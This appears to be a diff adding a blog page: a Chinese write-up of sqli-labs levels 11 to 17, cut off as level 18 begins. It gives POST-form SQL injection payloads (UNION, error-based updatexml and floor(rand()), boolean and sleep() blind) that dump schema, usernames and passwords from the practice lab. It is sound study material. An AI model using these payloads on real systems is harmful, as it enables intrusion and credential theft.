@@ -1,0 +1,847 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="sqli-labs 11-20关write up前10道题都是get型的，包含的种类也是比较多了，这次的是post型注入一般都是登陆绕过 因此需要用到火狐的插件：hackbar less11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)和上一次的一样，先输入单引号 1uname=&apos;&amp;amp;passwd=2&amp;amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs 11-22">
+<meta property="og:url" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/index.html">
+<meta property="og:site_name" content="Cherish">
+<meta property="og:description" content="sqli-labs 11-20关write up前10道题都是get型的，包含的种类也是比较多了，这次的是post型注入一般都是登陆绕过 因此需要用到火狐的插件：hackbar less11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)和上一次的一样，先输入单引号 1uname=&apos;&amp;amp;passwd=2&amp;amp;">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/5.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/6.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/7.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/8.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/9.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/10.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/11.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/12.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/13.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/14.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/15.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/16.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/17.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/18.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/19.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/20.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/21.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/24.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/25.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/22.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/23.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/26.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/27.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/28.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/29.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/30.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/31.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/32.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/33.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/34.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/35.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/36.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/37.png">
+<meta property="og:updated_time" content="2019-03-03T07:41:41.398Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sqli-labs 11-22">
+<meta name="twitter:description" content="sqli-labs 11-20关write up前10道题都是get型的，包含的种类也是比较多了，这次的是post型注入一般都是登陆绕过 因此需要用到火狐的插件：hackbar less11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)和上一次的一样，先输入单引号 1uname=&apos;&amp;amp;passwd=2&amp;amp;">
+<meta name="twitter:image" content="http://yoursite.com/2019/03/02/sqli-labs-11-22/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/03/02/sqli-labs-11-22/">
+
+
+
+
+
+  <title>sqli-labs 11-22 | Cherish</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Cherish</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/02/sqli-labs-11-22/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shang">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cherish">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sqli-labs 11-22</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-02T21:15:12+08:00">
+                2019-03-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="sqli-labs-11-20关write-up"><a href="#sqli-labs-11-20关write-up" class="headerlink" title="sqli-labs 11-20关write up"></a>sqli-labs 11-20关write up</h1><p>前10道题都是get型的，包含的种类也是比较多了，这次的是post型注入一般都是登陆绕过</p>
+<p>因此需要用到火狐的插件：<strong>hackbar</strong></p>
+<h2 id="less11-POST-Error-Based-Single-quotes-String-基于错误的POST型单引号字符型注入"><a href="#less11-POST-Error-Based-Single-quotes-String-基于错误的POST型单引号字符型注入" class="headerlink" title="less11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)"></a>less11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)</h2><p>和上一次的一样，先输入单引号</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname='&amp;passwd=2&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>发现报了sql语句的语法错误，那么应该存在sql注入，因为没过滤单引号，我们就可以闭合单引号进行注入</p>
+<p><img src="/2019/03/02/sqli-labs-11-22/1.png" alt="picture 1"></p>
+<p>之后进行猜字段</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1' order by 3 <span class="comment"># &amp;passwd=2&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/02/sqli-labs-11-22/2.png" alt="picture 2"></p>
+<p>当输入到3的时候便报错，由此可知有2个字段</p>
+<p>下面直接用union 语句查询，先输入1,2，看可以显示哪一个</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="comment">#&amp;passwd=2&amp;submit=Submit`</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/02/sqli-labs-11-22/3.png" alt="picture 3"></p>
+<p>之后查询数据库信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">concat_ws</span>(<span class="built_in">char</span>(<span class="string">' '</span>,<span class="string">':'</span>,<span class="string">' '</span>),<span class="keyword">user</span>(),<span class="keyword">version</span>(),<span class="keyword">database</span>()) <span class="comment">#&amp;passwd=2&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/02/sqli-labs-11-22/4.png" alt="picture 4"></p>
+<p>下一步，查找数据库的表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span>  <span class="comment">#&amp;passwd=2&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/02/sqli-labs-11-22/5.png" alt="picture 5"></p>
+<p>接下来要查users的列名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">'security'</span>  <span class="keyword">and</span> table_name=<span class="string">'users'</span><span class="comment">#&amp;passwd=2&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/02/sqli-labs-11-22/6.png" alt="picture 6"></p>
+<p>因为一般我们只关心用户的账号密码，有了它其他的登陆后一般就能查看了，拿到管理员的就最好不过了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=' union <span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="string">' '</span>,username,<span class="string">' '</span>),<span class="keyword">group_concat</span>(<span class="string">' '</span>,<span class="keyword">password</span>,<span class="string">' '</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="comment">#&amp;passwd=2&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/02/sqli-labs-11-22/7.png" alt="picture 7"></p>
+<p><img src="/2019/03/02/sqli-labs-11-22/8.png" alt="picture 8"></p>
+<h2 id="less-12-POST-Error-Based-Double-quotes-String-with-twist-基于错误的双引号POST型字符型变形的注入"><a href="#less-12-POST-Error-Based-Double-quotes-String-with-twist-基于错误的双引号POST型字符型变形的注入" class="headerlink" title="less 12 POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)"></a>less 12 POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)</h2><p>先按照上一题的思路来，输入’，发现没有报错，再输入”，还是没有报错，最后输到”)时候，报错了</p>
+<p>再之后的思路和上一题的一样</p>
+<p>最后得到的用户名和密码为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1") union <span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="string">' '</span>,username,<span class="string">' '</span>),<span class="keyword">group_concat</span>(<span class="string">' '</span>,<span class="keyword">password</span>,<span class="string">' '</span>) <span class="keyword">from</span> <span class="keyword">users</span><span class="comment">#&amp;passwd=2&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/02/sqli-labs-11-22/9.png" alt="picture 9"></p>
+<h2 id="less-13-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入"><a href="#less-13-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入" class="headerlink" title="less 13 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)"></a>less 13 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)</h2><p>这道题和一开始以为上一题类似，感觉只要将“)换成’)即可，但是当查询可以显示哪几列的时候，发现一个都没有显示</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1') union <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span><span class="comment">#&amp;passwd=2&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/02/sqli-labs-11-22/10.png" alt="picture 10"></p>
+<p>看到这个，第一反应就是和第五题类似，是布尔型盲注，时间性盲注和双注入了</p>
+<p>这道题用双注入的方法来注入</p>
+<p>获取数据库名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1') union <span class="keyword">select</span> <span class="keyword">count</span>(*), <span class="keyword">concat</span>((<span class="keyword">select</span> <span class="keyword">database</span>()), <span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">#&amp;passwd=2&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/02/sqli-labs-11-22/11.png" alt="picture 11"></p>
+<p>获取数据库表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1') union <span class="keyword">select</span> (updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> ),<span class="number">0x7e</span>),<span class="number">1</span>)) <span class="comment">#&amp;passwd=2&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/02/sqli-labs-11-22/12.png" alt="picture 12"></p>
+<p>获取数据库users列名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1') union <span class="keyword">select</span> (updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">and</span> table_name=<span class="string">'referers'</span> ),<span class="number">0x7e</span>),<span class="number">1</span>)) <span class="comment">#&amp;passwd=2&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/02/sqli-labs-11-22/13.png" alt="picture 13"></p>
+<p>获取该数据库信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1') union <span class="keyword">select</span> (updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="string">' '</span>,username,<span class="string">' '</span>) <span class="keyword">from</span> <span class="keyword">users</span>), <span class="number">0x7e</span>),<span class="number">1</span>)) <span class="comment">#&amp;passwd=2&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/02/sqli-labs-11-22/14.png" alt="picture 14"></p>
+<p><img src="/2019/03/02/sqli-labs-11-22/15.png" alt="picture 15"></p>
+<h2 id="less-14-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入"><a href="#less-14-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入" class="headerlink" title="less 14 POST - Double Injection - Single quotes-  String -twist (POST单引号变形双注入)"></a>less 14 POST - Double Injection - Single quotes-  String -twist (POST单引号变形双注入)</h2><p>这道题和上一道题类似，只要将’改为”即可</p>
+<p>最后得到的信息为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1" union <span class="keyword">select</span> (updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="string">' '</span>,username,<span class="string">' '</span>) <span class="keyword">from</span> <span class="keyword">users</span>), <span class="number">0x7e</span>),<span class="number">1</span>)) <span class="comment">#&amp;passwd=2&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/02/sqli-labs-11-22/16.png" alt="picture 16"></p>
+<h2 id="less-15-POST-Blind-Boolian-time-Based-Single-quotes-基于bool型-时间延迟单引号POST型盲注"><a href="#less-15-POST-Blind-Boolian-time-Based-Single-quotes-基于bool型-时间延迟单引号POST型盲注" class="headerlink" title="less 15 POST - Blind- Boolian/time Based - Single quotes (基于bool型/时间延迟单引号POST型盲注)"></a>less 15 POST - Blind- Boolian/time Based - Single quotes (基于bool型/时间延迟单引号POST型盲注)</h2><p>这道题第一反应感觉和上一道题类似，输入<code>&#39; select 1,2 #</code>时，界面显示登录成功，但是没有显示数字</p>
+<p>当进行双注入时候显示登录失败，所以，这道题只能进行盲注</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=-1' or length(database())=8 <span class="comment">#&amp;passwd=2&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/02/sqli-labs-11-22/17.png" alt="picture 17"></p>
+<h2 id="less-16-POST-Blind-Boolian-Time-Based-Double-quotes-基于bool型-时间延迟的双引号POST型盲注"><a href="#less-16-POST-Blind-Boolian-Time-Based-Double-quotes-基于bool型-时间延迟的双引号POST型盲注" class="headerlink" title="less 16 POST - Blind- Boolian/Time Based - Double quotes (基于bool型/时间延迟的双引号POST型盲注)"></a>less 16 POST - Blind- Boolian/Time Based - Double quotes (基于bool型/时间延迟的双引号POST型盲注)</h2><p>这道题和上一道题一样，也是盲注，只要将’改为”即可，这道题试一下时间盲注</p>
+<p>测试数据库的长度</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&amp;passwd=a")  or if(length(database())=8,1,sleep(5)) <span class="comment">#&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/02/sqli-labs-11-22/18.png" alt="picture 18"></p>
+<h2 id="less-17-POST-Update-Query-Error-Based-String-基于错误的更新查询POST注入"><a href="#less-17-POST-Update-Query-Error-Based-String-基于错误的更新查询POST注入" class="headerlink" title="less 17 POST - Update Query- Error Based - String (基于错误的更新查询POST注入)"></a>less 17 POST - Update Query- Error Based - String (基于错误的更新查询POST注入)</h2><p>这道题一开始有点摸不着头脑，当输入错误的用户名密码时候，它显示让我走远一点（……笑cry.jpg……）当用户名输入admin时，它显示已经更新密码，最后百度了一下知道这一题是一个更新密码的语句，类似如下:</p>
+<p><code>update tablename set password=&#39;用户输入&#39; where username=&#39;用户输入&#39;</code></p>
+<p>类似这种我们需要爆出数据，就不能使用union执行查询语句了，这里常规的思路就是利用报错直接爆出数据。有两种方式：</p>
+<p>最开始我是使用黑盒测试的，怎么弄都是让我走远点，就是不能成功注入，但是，后来看了源码才知道，用户名必须要输入正确。</p>
+<p>所以要绕过通过用户名查询出用户名和密码，这个我们只能猜吧，比如admin，root，test什么的，这个可以用字典，在这里我就当知道是admin了，直接用admin就考虑下一步</p>
+<h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h5><p>语法：UPDATEXML (XML_document, XPath_string, new_value);</p>
+<ul>
+<li><p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p>
+</li>
+<li><p>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找<a href="http://www.runoob.com/xpath/xpath-tutorial.html" target="_blank" rel="noopener">教程</a>。</p>
+</li>
+<li><p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>
+</li>
+</ul>
+<p>作用：改变文档中符合条件的节点的值</p>
+<p>知道原理之后就开始注入了</p>
+<p>updatexml的第一个参数和第三个参数随便一个数字就行</p>
+<p>获取数据库名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin &amp;passwd=2' or updatexml(1,concat(1,database(),1),1) <span class="comment">#&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/02/sqli-labs-11-22/19.png" alt="picture 19"></p>
+<p>获取数据库表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin &amp;passwd=2' or updatexml(1,concat(1,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span>),<span class="number">1</span>),<span class="number">1</span>) <span class="comment">#&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/02/sqli-labs-11-22/20.png" alt="picture 20"></p>
+<p>获取数据库列名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin &amp;passwd=2' or updatexml(1,concat(1,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">and</span> table_name=<span class="string">'users'</span>),<span class="number">1</span>),<span class="number">1</span>) <span class="comment">#&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/02/sqli-labs-11-22/21.png" alt="picture 21"></p>
+<p>获取数据库信息(这一步也是满满的曲折啊)</p>
+<p>发现不能不能先select出同一表中的某些值，再update这个表(在同一语句中)</p>
+<p><img src="/2019/03/02/sqli-labs-11-22/24.png" alt="picture 24"></p>
+<p>再加一层select行不行呢，发现还要给里面那层给个别名哦</p>
+<p><img src="/2019/03/02/sqli-labs-11-22/25.png" alt="picture 25"></p>
+<p>那就起个hahaha名咯，在整个select语句后面加就行，终于搞出来了，不容易啊</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin &amp;passwd=2' or updatexml(1,concat(1,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(username) <span class="keyword">from</span> (<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span>)hahaha),<span class="number">1</span>),<span class="number">1</span>)<span class="comment">#&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/02/sqli-labs-11-22/22.png" alt="picture 22"></p>
+<p><img src="/2019/03/02/sqli-labs-11-22/23.png" alt="picture 23"></p>
+<h2 id="less-18-POST-Header-Injection-Uagent-field-Error-based-基于错误的用户代理，头部POST注入"><a href="#less-18-POST-Header-Injection-Uagent-field-Error-based-基于错误的用户代理，头部POST注入" class="headerlink" title="less 18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)"></a>less 18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)</h2><p>刚开始，在两个表单里尝试各种payload，发现都没法注入了，怀疑它已经做了防护了。我偷偷查看一下源码发现果然如此</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$uname = check_input($_POST[<span class="string">'uname'</span>]);</span><br><span class="line">$passwd = check_input($_POST[<span class="string">'passwd'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		$value = substr($value,<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">			&#123;</span><br><span class="line">			$value = <span class="string">"'"</span> . mysql_real_escape_string($value) . <span class="string">"'"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> $value;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>简单看下函数功能：</p>
+<p>substr(str,pos,len)从pos开始的位置，截取len个字符；</p>
+<p>magic_quotes_gpc()自动将进入 PHP 脚本的数据进行转义的；</p>
+<p>ctype_digit()检查提供的 string 和 text 里面的字符是不是都是数字；</p>
+<p>intval()获取变量的整数值.</p>
+<p>所以不能利用username或者password进行注入。那我们应该应该去寻找别的注入点。</p>
+<p>一般注入位置有：</p>
+<ul>
+<li><p>URL参数提交，主要为GET请求参数；</p>
